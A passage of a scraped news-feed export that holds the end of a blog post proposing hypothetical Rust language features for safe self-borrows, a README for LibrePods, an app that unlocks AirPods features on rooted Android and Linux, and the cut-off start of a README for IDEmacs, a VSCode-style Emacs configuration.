    &lt;p&gt;&lt;code&gt;&amp;amp;own T&lt;/code&gt; is similar to &lt;code&gt;&amp;amp;mut T&lt;/code&gt;, except that it owns the referenced value. This means that it has no post-conditions like &lt;code&gt;&amp;amp;mut T&lt;/code&gt; does, and you can freely move fields out of the reference, and it will implicitly drop anything remaining when it goes out of scope. However, unlike &lt;code&gt;Box&amp;lt;T&amp;gt;&lt;/code&gt;, &lt;code&gt;&amp;amp;own T&lt;/code&gt; does not own the memory, meaning you can take an &lt;code&gt;&amp;amp;own T&lt;/code&gt; reference to values on the stack when you need to drop them, and even recursively take &lt;code&gt;&amp;amp;own T&lt;/code&gt; references to fields.&lt;/p&gt;
    &lt;head rend="h3"&gt;Owned reference example&lt;/head&gt;
    &lt;p&gt;So what would a correct version of &lt;code&gt;Drop&lt;/code&gt; look like? Let’s look at an example.&lt;/p&gt;
    &lt;p&gt;First, let’s start with a simple struct with some fields and methods:&lt;/p&gt;
    &lt;code&gt;struct MyStrings {
    x: String,
    y: String,
}
impl MyStrings {
    fn some_method(&amp;amp;self) {
        println!("{} {}", self.x, self.y);
    }
}
&lt;/code&gt;
    &lt;p&gt;We can implement &lt;code&gt;Drop&lt;/code&gt; like this. &lt;code&gt;self&lt;/code&gt; starts out as an owned reference to the full type, meaning we can call methods on it like normal. Once we move fields out of it, the type of &lt;code&gt;self&lt;/code&gt; changes to the corresponding partial type (recall that Rust already supports partially moved types as an inconceivable type).&lt;/p&gt;
    &lt;code&gt;impl Drop for MyStrings {
    fn drop(&amp;amp;own self) {
        // self has type &amp;amp;own MyStrings
     
        // we can call methods within drop()
        self.some_method();
     
        // now let's move a field
        let _ = self.x;
        // self now has type &amp;amp;own MyStrings{y}
     
        // we're too lazy to drop the other field, but it will be dropped implicitly
        // drop(self.y)
    }
}
&lt;/code&gt;
    &lt;p&gt;When an owned reference goes out of scope, all remaining fields are dropped implicitly, not just inside a &lt;code&gt;drop&lt;/code&gt; method, but anywhere an &lt;code&gt;&amp;amp;own T&lt;/code&gt; exists. This is important a) for avoiding leaks while unwinding when an exception is thrown and b) because people will often not explicitly drop everything in a &lt;code&gt;drop&lt;/code&gt; impl.&lt;/p&gt;
    &lt;head rend="h3"&gt;Initialization&lt;/head&gt;
    &lt;p&gt;&lt;code&gt;Drop&lt;/code&gt; isn’t the only place where non-movable types cause a problem. Rust’s entire design is centered around the assumption that you can move anything. You move values to transfer ownership, you move values to change types, you move values to initialize objects, etc. Therefore, making Rust usable for non-movable types requires more changes.&lt;/p&gt;
    &lt;p&gt;Fortunately, we already have to support partially moved types anyway, and that also conveniently covers the initialization case as well as the destruction case. Initialization is basically the same process as dropping, just in reverse:&lt;/p&gt;
    &lt;code&gt;let mut new = MyStrings{};
// new has type MyStrings{}, a partially moved value
// this has the *memory layout* of MyStrings, but with no fields initialized

new.x = "Hello".to_string();
// new has type MyStrings{x}

new.y = "World".to_string();
// new has type MyStrings{x,y}, which is the same as a fully initialized MyStrings
&lt;/code&gt;
    &lt;head rend="h2"&gt;Safe transmute&lt;/head&gt;
    &lt;p&gt;However, there’s still one problem - in-place transmutes between different base types.&lt;/p&gt;
    &lt;p&gt;Recall that our future state machine enum looks something like this:&lt;/p&gt;
    &lt;code&gt;enum MyFuture {
    Initial(State0),
    Await1(State1),
    Await2(State2),
    Final,
}
&lt;/code&gt;
    &lt;p&gt;Our previous examples with drop and initialization changed the actual type (i.e. with different fields initialized or not), but the base type (which controls memory layout and method resolution) was the same. However, here, each enum variant has a different base type.&lt;/p&gt;
    &lt;p&gt;Currently in Rust, you always have to move values when converting between different base types. E.g. even just wrapping a value in a newtype (or unwrapping it) requires moving the value. However, the “move and reconstruct” paradigm won’t work here because our enum variants may contain non-movable types. Therefore, we need a way to convert between the different state types in-place.&lt;/p&gt;
    &lt;p&gt;Therefore, we need to add three things to Rust:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;A way to specify that different types have the same memory layout&lt;/item&gt;
      &lt;item&gt;A way to specify that certain fields have the same location within the type for different types&lt;/item&gt;
      &lt;item&gt;The type system understands this and allows safe transmutes between them.&lt;/item&gt;
      &lt;item&gt;Allow updating enums in a way that is aware of this.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Example&lt;/head&gt;
    &lt;p&gt;Suppose we have an async function like this:&lt;/p&gt;
    &lt;code&gt;async fn foo(mut s: String) {
    let r = &amp;amp;mut s;
    sub().await;
    
    let z = if true {r.as_bytes()} else {"hello".as_bytes()};
    sub().await;
    
    println!("{:?}", z);
    sub().await;
    
    println!("{}", s)
}
&lt;/code&gt;
    &lt;p&gt;The corresponding future enum states are as follows, where &lt;code&gt;SubFut&lt;/code&gt; is the name of the anonymous future type returned by the &lt;code&gt;sub()&lt;/code&gt; function.&lt;/p&gt;
    &lt;code&gt;struct State0 {s: String}
struct State1&amp;lt;'a&amp;gt; {s: !'a mut String, r: &amp;amp;'a mut String}
struct State2&amp;lt;'a&amp;gt; {s: !'a mut String, z: &amp;amp;'a [u8]}
struct State3 {s: String}

enum MyFuture {
    Initial(State0),
    Await1(bind 'a in State1&amp;lt;'a&amp;gt;, SubFut),
    Await2(bind 'a in State2&amp;lt;'a&amp;gt;, SubFut),
    Await3(State3, SubFut),
    Final,
}
&lt;/code&gt;
    &lt;p&gt;The problem comes when we need to implement the state transitions (within the &lt;code&gt;poll&lt;/code&gt; method). Since &lt;code&gt;State1&lt;/code&gt; and &lt;code&gt;State2&lt;/code&gt; contain a non-movable field (&lt;code&gt;s&lt;/code&gt;), they have to be converted in-place.&lt;/p&gt;
    &lt;p&gt;I’m not sure what the best way to do this is, but I’m assuming we have some sort of annotation which allows us to mark that these types all use the same memory layout, and that &lt;code&gt;s&lt;/code&gt; is located in the same place in each type, allowing us to safely transmute between them.&lt;/p&gt;
    &lt;p&gt;The basic transition process for say, state 1 to state 2, is to start with an owned reference to &lt;code&gt;State1&lt;/code&gt;. Then we remove the &lt;code&gt;r&lt;/code&gt; field and use it to compute &lt;code&gt;z&lt;/code&gt;, as per the code between the two await points. This leaves the pointer with type &lt;code&gt;State1{s}&lt;/code&gt;. Then we can safely transmute this to &lt;code&gt;State2{s}&lt;/code&gt;, since &lt;code&gt;s&lt;/code&gt; is guaranteed to be in the same place in both types. Finally, we add the &lt;code&gt;z&lt;/code&gt; field back, to get a full &lt;code&gt;State2&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h2"&gt;Safe enum updates&lt;/head&gt;
    &lt;p&gt;There’s still the question of how the compiler knows that enums are being updated in a safe manner.&lt;/p&gt;
    &lt;head rend="h3"&gt;&amp;amp;mut to &amp;amp;own&lt;/head&gt;
    &lt;p&gt;The first question is how to temporarily violate the type invariants during the update. &lt;code&gt;poll&lt;/code&gt; takes a mutable reference to &lt;code&gt;self&lt;/code&gt;, but in Rust, &lt;code&gt;&amp;amp;mut T&lt;/code&gt; is required to preserve the type invariants of &lt;code&gt;T&lt;/code&gt; at all times (well, there are some minor exceptions, but those are built into the compiler, not something users have direct access to).&lt;/p&gt;
    &lt;p&gt;You’re not allowed to move out of a mutable reference, because if this were allowed, and an exception were thrown and then caught, someone could access the reference again even though the pointee is now invalid. Therefore, we need to somehow get an owned reference to the enum variant instead.&lt;/p&gt;
    &lt;p&gt;However, there’s one workaround. You can’t temporarily move out of a &lt;code&gt;&amp;amp;mut T&lt;/code&gt; because that would violate the invariant of &lt;code&gt;T&lt;/code&gt;, but you can move out of a &lt;code&gt;&amp;amp;mut Option&amp;lt;T&amp;gt;&lt;/code&gt;. Basically, we’ve widened the type invariant of the pointee to now include an “invalid” state. That state will never be seen in normal operation (assuming we always put the value back when done with it), but would be seen if an exception is thrown while the value is removed, and then that exception is caught and the reference accessed again.&lt;/p&gt;
    &lt;p&gt;For normal code, wrapping everything in an &lt;code&gt;Option&lt;/code&gt; means adding a runtime cost and runtime type checks, which is why I ruled it out in previous discussions (e.g. restricting the discussion to “safe, zero-cost Rust”). However, it turns out that the &lt;code&gt;Future&lt;/code&gt; api already effectively forces everything to have an extra “invalid” state anyway, so there’s no additional cost to having one. This is the reason for the extra &lt;code&gt;Final&lt;/code&gt; state in all the enums shown above.&lt;/p&gt;
    &lt;p&gt;Therefore, when updating the enum state during &lt;code&gt;poll&lt;/code&gt;, we start by setting the tag to &lt;code&gt;Final&lt;/code&gt;, which lets us get ownership over the current contents of the enum. Under normal operation, we would then set it back to a valid state, but if an exception is thrown in the middle and then caught and the future is re-polled, the future would just be in the &lt;code&gt;Final&lt;/code&gt; state (which will panic when polled, like a future typically will when polled after completion).&lt;/p&gt;
    &lt;head rend="h3"&gt;Tracking self-ness&lt;/head&gt;
    &lt;p&gt;The basic process is to start by setting the enum tag to &lt;code&gt;Final&lt;/code&gt;, which gives an owned reference to the former contents of the enum variant, much like how you can take an owned value out of a &lt;code&gt;&amp;amp;mut Option&amp;lt;T&amp;gt;&lt;/code&gt; (except that taking an owned reference is not something that currently exists in Rust).&lt;/p&gt;
    &lt;p&gt;Then we perform various mutations through the owned reference, which changes its type from &lt;code&gt;&amp;amp;own State1&lt;/code&gt; to &lt;code&gt;&amp;amp;own State2&lt;/code&gt; or whatever. Finally, once the variant pointer is updated to the correct type, we can set the tag of the original enum to match, thus restoring the invariant.&lt;/p&gt;
    &lt;p&gt;However, the last part is trickier than it sounds. The problem is that even if we have a &lt;code&gt;&amp;amp;mut MyFuture&lt;/code&gt; (with the variant part currently borrowed) and a &lt;code&gt;&amp;amp;own State2&lt;/code&gt; or whatever, the compiler can’t know that it is safe to set the tag back to &lt;code&gt;Await2&lt;/code&gt; because it doesn’t know that the &lt;code&gt;&amp;amp;own State2&lt;/code&gt; actually points to the enum you’re trying to update.&lt;/p&gt;
    &lt;p&gt;Therefore, we need to add a function-local analysis pass to the compiler to facilitate this. When you borrow the variant of an enum, the compiler will keep track of the relation between the two local variables as long as they stay in the function, and allow a safe update of the enum if the variant pointer has the corresponding type.&lt;/p&gt;
    &lt;head rend="h3"&gt;Another inconceivable type?&lt;/head&gt;
    &lt;p&gt;Now you might be wondering, isn’t that enum-alias analysis pass yet another shadow type checker? Does this mean we have another inconceivable type to add to the type system?&lt;/p&gt;
    &lt;p&gt;It is a shadow type checker, but fortunately we don’t have to add it to the type system. The reason is that in order to support safe async functions, we need to be able to name the type of any local variable that is held across an await point. Therefore, we only need to add inconceivable types to the type system if it is possible for them to exist across an await.&lt;/p&gt;
    &lt;p&gt;As shown earlier, partially moved types and borrowed types can both exist across an await, which is why we have to add them to the type system. However, if we’re adding a new shadow type checker, we can just arbitrarily declare that the analysis stops at awaits, which avoids the need to add any new types to the formal type system.&lt;/p&gt;
    &lt;p&gt;Fortunately, the only thing we actually need the enum-alias pass for is to support safe enum updates within the &lt;code&gt;Future::poll&lt;/code&gt; method, and &lt;code&gt;poll&lt;/code&gt; is a non-async method, which means it can never contain awaits anyway. Therefore, there’s no problem with restricting our new safe enum update feature to not span awaits.&lt;/p&gt;
    &lt;head rend="h3"&gt;Leak&lt;/head&gt;
    &lt;p&gt;This sort of ad-hoc special analysis is certainly not elegant. In an ideal world, Rust would not have to have any inconceivable types at all, not even ones that don’t cross awaits. And it certainly would be possible to turn this into a general purpose feature that is a first-class part of the type system.&lt;/p&gt;
    &lt;p&gt;However, doing this the proper way would require the introduction of non-forgettable types. Some people have already been asking for non-forgettable types to be added to Rust anyway for unrelated reasons (via a “&lt;code&gt;Leak&lt;/code&gt;” auto-trait), but the results would not be pretty.&lt;/p&gt;
    &lt;p&gt;This post is already very long, and non-forgettable types would add much more complexity than anything I’ve covered, since it violates a more central assumption of the language than even non-movable types do. Therefore, for the sake of keeping this proposal merely very long and minimizing the complexity of Rust as much as possible, I think it’s best to just punt on that subject and implement enum alias checking via special compiler magic rather than non-forgettable types.&lt;/p&gt;
    &lt;p&gt;The “special compiler magic” approach has the downside that it will be impossible to factor parts of the &lt;code&gt;poll&lt;/code&gt; method out into separate helper functions, because the required types won’t exist in the type system and hence can’t be named in the function signature, but I think that’s a small price to pay for leaving this can of worms unopened.&lt;/p&gt;
    &lt;head rend="h2"&gt;Pin and Move&lt;/head&gt;
    &lt;p&gt;With that out of the way, there’s one last topic to address, &lt;code&gt;Pin&lt;/code&gt;.&lt;/p&gt;
    &lt;p&gt;You may have noticed a conspicuous lack of &lt;code&gt;Pin&lt;/code&gt; in all my examples. That’s because &lt;code&gt;Pin&lt;/code&gt; was just a hack added due to the inability to introduce a &lt;code&gt;Move&lt;/code&gt; auto-trait in a fully backwards compatible manner. But since the changes I’m proposing require breaking strict backwards compatibility anyway (good luck fixing the type signature of &lt;code&gt;Drop&lt;/code&gt; in a backwards compatible manner!), we might as well assume that &lt;code&gt;Pin&lt;/code&gt; gets replaced by a &lt;code&gt;Move&lt;/code&gt; auto-trait for moveable types while we’re at it.&lt;/p&gt;
    &lt;p&gt;However, we still need a way to replicate the functions &lt;code&gt;Pin&lt;/code&gt; is currently serving, as it doesn’t work quite the same way that &lt;code&gt;Move&lt;/code&gt; would.&lt;/p&gt;
    &lt;head rend="h3"&gt;Enum refinements&lt;/head&gt;
    &lt;p&gt;In current Rust, when a &lt;code&gt;Future&lt;/code&gt; is initially created, you can freely move it around. However, you have to pin it before you can poll it, and once polled, it becomes unmovable.&lt;/p&gt;
    &lt;p&gt;In a &lt;code&gt;Move&lt;/code&gt; world, this is basically saying that the &lt;code&gt;Initial&lt;/code&gt; state of every future enum state machine has to be &lt;code&gt;Move&lt;/code&gt;, but the other states of the enum may be non-&lt;code&gt;Move&lt;/code&gt;. Since &lt;code&gt;poll&lt;/code&gt; takes the enum by &lt;code&gt;&amp;amp;mut&lt;/code&gt;, it can switch between the states and thus the future has to be assumed to be non-movable after polling.&lt;/p&gt;
    &lt;p&gt;However, Rust’s current design doesn’t support any way to reason like that. Rust’s current type system is designed around the assumption that every value has exactly one type and that type never changes, which means that there is no way to talk about properties that hold now but not in the future. If an enum type implements an auto-trait, that means that every variant of the enum satisfies that trait, not just one variant.&lt;/p&gt;
    &lt;p&gt;This isn’t just a problem for futures. It often comes up in current Rust with &lt;code&gt;Copy&lt;/code&gt; too, as in “why can’t I copy &lt;code&gt;None&lt;/code&gt;”? For example, the following code will not compile because the array initial value has to be &lt;code&gt;Copy&lt;/code&gt;, but &lt;code&gt;Option&amp;lt;SomeNotCopyType&lt;/code&gt; is not &lt;code&gt;Copy&lt;/code&gt; due to the unused &lt;code&gt;Some&lt;/code&gt; variant.&lt;/p&gt;
    &lt;code&gt;struct SomeNotCopyType;

let foo: [Option&amp;lt;SomeNotCopyType&amp;gt;; 8] = [None; 8];
&lt;/code&gt;
    &lt;p&gt;Therefore, we need a way to distinguish between “every variant of the enum satisfies this property” and “the current variant of the enum satisfies this property”. The syntax &lt;code&gt;T: Future + Move&lt;/code&gt; already means the former, so we need to come up with different syntax for the latter.&lt;/p&gt;
    &lt;p&gt;I’m not sure what the best syntax is, so I’ll just go with &lt;code&gt;T: Future if Move&lt;/code&gt;. &lt;code&gt;T: Future if Move&lt;/code&gt; means “&lt;code&gt;T&lt;/code&gt; is (any) future, and the value is currently &lt;code&gt;Move&lt;/code&gt;”, while &lt;code&gt;T: Future + Move&lt;/code&gt; instead means “T is a future type where every variant is &lt;code&gt;Move&lt;/code&gt;” (which would be &lt;code&gt;Unpin&lt;/code&gt; in current Rust).&lt;/p&gt;
    &lt;p&gt;Since explicit trait implementations can only be done for the enum type as a whole, this sort of “per-variant trait impl” only makes sense for auto-traits and lifetimes. Therefore, the right side is restricted to auto-traits and lifetime bounds. &lt;code&gt;T: Future if (Move + 'static)&lt;/code&gt; would be allowed, but &lt;code&gt;T: Future if Clone&lt;/code&gt; would not.&lt;/p&gt;
    &lt;p&gt;Additionally, the “if” syntax can also be applied to explicit non-generic enum types. E.g &lt;code&gt;foo: MyEnum if Copy&lt;/code&gt; means &lt;code&gt;foo&lt;/code&gt; has type &lt;code&gt;MyEnum&lt;/code&gt; and its current variant is one that is &lt;code&gt;Copy&lt;/code&gt;.&lt;/p&gt;
    &lt;head rend="h3"&gt;Stable deref types&lt;/head&gt;
    &lt;p&gt;In general, every borrowed type will be non-moveable. However, container types such as &lt;code&gt;Box&lt;/code&gt;, &lt;code&gt;Vec&lt;/code&gt;, &lt;code&gt;String&lt;/code&gt;, &lt;code&gt;Rc&lt;/code&gt;, etc. could optionally tell the compiler that borrowing the contents of the container does not cause the container itself to become non-moveable. This is what makes it possible to return data along with a pointer to that data. The outer value will always be moved by Rust’s nature, but this is still safe as long as the borrowed data does not move.&lt;/p&gt;
    &lt;head rend="h1"&gt;Conclusion&lt;/head&gt;
    &lt;p&gt;Whew, we’re finally done! We’ve finally seen how to safely implement self-borrows and safe async functions in Hypothetical Future Rust.&lt;/p&gt;
    &lt;p&gt;To be honest, I think there’s approximately zero chance that this gets implemented in Rust, since the nature of a language with a large ecosystem means that you can’t just break backwards compatibility, and even seemingly trivial changes in Rust have been held up forever due to concerns around stabilization or documentation or whatever.&lt;/p&gt;
    &lt;p&gt;However, I hope that this post still helps people to think about the nature of the problem. In particular, it’s frustrating to see people say that self-borrows are an inherent impossibility with borrow checking when that limitation is really just a consequence of idiosyncratic choices made by Rust, and if not in current Rust, it certainly could have been supported in an alternate history Rust that made slightly different choices, and likely will be supported in future languages with borrow checking.&lt;/p&gt;
    &lt;p&gt;Anyway, if you have any comments or suggestions, please let me know by commenting on Reddit.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://blog.polybdenum.com/2024/06/07/the-inconceivable-types-of-rust-how-to-make-self-borrows-safe.html"/><published>2025-11-15T23:31:39+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45941596</id><title>AirPods libreated from Apple's ecosystem</title><updated>2025-11-16T15:08:48.686047+00:00</updated><content>&lt;doc fingerprint="ff6c8a1cca6b15c8"&gt;
  &lt;main&gt;
    &lt;p&gt;LibrePods unlocks Apple's exclusive AirPods features on non-Apple devices. Get access to noise control modes, adaptive transparency, ear detection, hearing aid, customized transparency mode, battery status, and more - all the premium features you paid for but Apple locked to their ecosystem.&lt;/p&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell role="head"&gt;Status&lt;/cell&gt;
        &lt;cell role="head"&gt;Device&lt;/cell&gt;
        &lt;cell role="head"&gt;Features&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;AirPods Pro (2nd Gen)&lt;/cell&gt;
        &lt;cell&gt;Fully supported and tested&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;✅&lt;/cell&gt;
        &lt;cell&gt;AirPods Pro (3rd Gen)&lt;/cell&gt;
        &lt;cell&gt;Fully supported (except heartrate monitoring)&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;Other AirPods models&lt;/cell&gt;
        &lt;cell&gt;Basic features (battery status, ear detection) should work&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;p&gt;Most features should work with any AirPods. Currently, I've only got AirPods Pro 2 to test with.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Noise Control Modes: Easily switch between noise control modes without having to reach out to your AirPods to long press&lt;/item&gt;
      &lt;item&gt;Ear Detection: Controls your music automatically when you put your AirPods in or take them out, and switch to phone speaker when you take them out&lt;/item&gt;
      &lt;item&gt;Battery Status: Accurate battery levels&lt;/item&gt;
      &lt;item&gt;Head Gestures: Answer calls just by nodding your head&lt;/item&gt;
      &lt;item&gt;Conversational Awareness: Volume automatically lowers when you speak&lt;/item&gt;
      &lt;item&gt;Hearing Aid*&lt;/item&gt;
      &lt;item&gt;Customize Transparency Mode*&lt;/item&gt;
      &lt;item&gt;Multi-device connectivity* (upto 2 devices)&lt;/item&gt;
      &lt;item&gt;Other customizations: &lt;list rend="ul"&gt;&lt;item&gt;Rename your AirPods&lt;/item&gt;&lt;item&gt;Customize long-press actions&lt;/item&gt;&lt;item&gt;Few accessibility features&lt;/item&gt;&lt;item&gt;And more!&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See our pinned issue for a complete feature list and roadmap.&lt;/p&gt;
    &lt;p&gt;The Linux version runs as a system tray app. Connect your AirPods and enjoy:&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;Battery monitoring&lt;/item&gt;
      &lt;item&gt;Automatic Ear detection&lt;/item&gt;
      &lt;item&gt;Conversational Awareness&lt;/item&gt;
      &lt;item&gt;Switching Noise Control modes&lt;/item&gt;
      &lt;item&gt;Device renaming&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Note&lt;/p&gt;
    &lt;p&gt;Work in progress, but core functionality is stable and usable.&lt;/p&gt;
    &lt;p&gt;For installation and detailed info, see the Linux README.&lt;/p&gt;
    &lt;p&gt;here's a very unprofessional demo video&lt;/p&gt;
    &lt;head class="px-3 py-2"&gt;demo-video.mp4&lt;/head&gt;
    &lt;p&gt;Caution&lt;/p&gt;
    &lt;p&gt;You must have a rooted device with Xposed to use LibrePods on Android. This is due to a bug in the Android Bluetooth stack. Please upvote the issue by clicking the '+1' icon on the IssueTracker page.&lt;/p&gt;
    &lt;p&gt;There are no exceptions to the root requirement until Google merges the fix.&lt;/p&gt;
    &lt;p&gt;Until then, you must xposed. I used to provide a non-xposed method too, where the module used overlayfs to replace the bluetooth library with a locally patched one, but that was broken due to how various devices handled overlayfs and a patched library. With xposed, you can also enable the DID hook enabling a few extra features.&lt;/p&gt;
    &lt;p&gt;Turns out, if you change the manufacturerid to that of Apple, you get access to several special features!&lt;/p&gt;
    &lt;p&gt;Upto two devices can be simultaneously connected to AirPods, for audio and control both. Seamless connection switching. The same notification shows up on Apple device when Android takes over the AirPods as if it were an Apple device ("Move to iPhone"). Android also shows a popup when the other device takes over.&lt;/p&gt;
    &lt;p&gt;Accessibility settings like customizing transparency mode (amplification, balance, tone, conversation boost, and ambient noise reduction), and loud sound reduction can be configured.&lt;/p&gt;
    &lt;p&gt;All hearing aid customizations can be done from Android, including setting the audiogram result. The app doesn't provide a way to take a hearing test because it requires much more precision. It is much better to use an already available audiogram result.&lt;/p&gt;
    &lt;p&gt;To enable these features, enable App Settings -&amp;gt; &lt;code&gt;act as Apple Device&lt;/code&gt;.&lt;/p&gt;
    &lt;list rend="ul"&gt;
      &lt;item&gt;&lt;p&gt;Due to recent AirPods' firmware upgrades, you must enable&lt;/p&gt;&lt;code&gt;Off listening mode&lt;/code&gt;to switch to&lt;code&gt;Off&lt;/code&gt;. This is because in this mode, louds sounds are not reduced.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If you have take both AirPods out, the app will automatically switch to the phone speaker. But, Android might keep on trying to connect to the AirPods because the phone is still connected to them, just the A2DP profile is not connected. The app tries to disconnect the A2DP profile as soon as it detects that Android has connected again if they're not in the ear.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;When renaming your AirPods through the app, you'll need to re-pair them with your phone for the name change to take effect. This is a limitation of how Bluetooth device naming works on Android.&lt;/p&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;If you want the AirPods icon and battery status to show in Android Settings app, install the app as a system app by using the root module.&lt;/p&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;LibrePods - AirPods liberated from Apple’s ecosystem Copyright (C) 2025 LibrePods contributors&lt;/p&gt;
    &lt;p&gt;This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or any later version.&lt;/p&gt;
    &lt;p&gt;This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.&lt;/p&gt;
    &lt;p&gt;You should have received a copy of the GNU General Public License along with this program. If not, see https://www.gnu.org/licenses/.&lt;/p&gt;
    &lt;p&gt;All trademarks, logos, and brand names are the property of their respective owners. Use of them does not imply any affiliation with or endorsement by them. All AirPods images, symbols, and the SF Pro font are the property of Apple Inc.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://github.com/kavishdevar/librepods"/><published>2025-11-16T00:01:25+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45941835</id><title>IDEmacs: A Visual Studio Code clone for Emacs</title><updated>2025-11-16T15:08:47.818301+00:00</updated><content>&lt;doc fingerprint="8e2cd9706e052f6c"&gt;
  &lt;main&gt;
    &lt;table&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;img&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;vscode&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;.dir-locals.el&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;.gitignore&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;LICENSE&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row span="3"&gt;
        &lt;cell&gt;README.org&lt;/cell&gt;
      &lt;/row&gt;
      &lt;row&gt;
        &lt;cell&gt;TODO.org&lt;/cell&gt;
      &lt;/row&gt;
    &lt;/table&gt;
    &lt;head rend="h2"&gt;Description&lt;/head&gt;
    &lt;p&gt;IDEmacs aims to be a set of Emacs configurations which provide an out-of-the-box experience similar (if not identical) to popular GUI IDEs and editors.&lt;/p&gt;
    &lt;p&gt;It is aimed at…&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Programmers coming to Emacs from other IDEs, or even first-time programmers familiar with only office applications.&lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Beginner Common Lisp and Scheme programmers, who need the functionality of Emacs (Sly/Geiser + structural editing) without having to perform unnecessary setup and without dealing with an alien style of keybindings. In other words, similar to Portacle or Guile Studio.1&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Some may say that we should improve support for Common Lisp and Scheme in other editors and IDEs instead. Still others may say that we should work on a better Lisp IDE than Emacs instead (such as Second Climacs or Lem). All great points. IDEmacs is just a band-aid for the present situation, where Emacs + Sly/Geiser is the best Lisp/Scheme IDE.&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;Non-programmers who want a fully-featured Org, Markdown, or LaTeX editor with idiomatic shortcuts and mouse-friendly GUI.&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;It provides…&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;
        &lt;p&gt;GUI and mouse support, in addition to a keyboard-driven interface.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;Unlike most starter kits, we do not hide GUI elements by default.&lt;/item&gt;
          &lt;item&gt;&lt;p&gt;We support configuration via the&lt;/p&gt;&lt;code&gt;custom&lt;/code&gt;GUI, not just Elisp&lt;list rend="ul"&gt;&lt;item&gt;Supporting GUI and &lt;code&gt;custom&lt;/code&gt;means we cannot use&lt;code&gt;straight&lt;/code&gt;&lt;/item&gt;&lt;/list&gt;&lt;/item&gt;
          &lt;item&gt;Supporting GUI and &lt;/item&gt;
          &lt;item&gt;If resources allow, we may implement new GUIs in Emacs&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;Keybindings that follow popular GUI and IDE conventions. 2&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;CUA mode is just the start - much more keybinding configuration is needed to provide an unsurprising experince. And that's before we even get to the IDE-specific keybindings.&lt;/item&gt;
          &lt;item&gt;This excludes starter kits that use Evil by default, such as Spacemacs or Doom.&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
      &lt;item&gt;
        &lt;p&gt;A fully-featured, fast, and configuration-free Emacs experience, like any starter kit/distro.&lt;/p&gt;
        &lt;list rend="ul"&gt;
          &lt;item&gt;The configuration uses idiomatic Elisp and contains a generous amount of comments, valuable to anyone interested in learning to configure Emacs using Elisp.&lt;/item&gt;
        &lt;/list&gt;
      &lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;Perfectly imitating the GUIs and subtle behaviour differences of IDEs is desirable, but not top priority. Given our limited resources, we aim for "good enough".&lt;/p&gt;
    &lt;p&gt;We hope this gives new users a comfortable starting point, and make them more likely to stick around to discover the possibilities of Emacs' malleability, rather than being driven off by the default experience.&lt;/p&gt;
    &lt;head rend="h3"&gt;VSCode configuration (WIP)&lt;/head&gt;
    &lt;p&gt;This is the first and currently the only IDE configuration provided.&lt;/p&gt;
    &lt;p&gt;Currently, it brings together -&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;VSCode Dark Plus theme&lt;/item&gt;
      &lt;item&gt;Treemacs for the sidebar file browser ("Explorer")&lt;/item&gt;
      &lt;item&gt;Centaur Tabs for the tab bar&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;breadcrumb&lt;/code&gt;to show file paths as breadcrumbs&lt;/item&gt;
      &lt;item&gt;&lt;code&gt;idle-highlight-mode&lt;/code&gt;to automatically highlight occurrences of the symbol at point&lt;/item&gt;
      &lt;item&gt;Emulation of most keybindings listed in the "General", "Basic Editing", "Rich Languages Editing", and "Multi-cursor and selection" sections of the VSCode keyboard shortcuts cheatsheet.&lt;/item&gt;
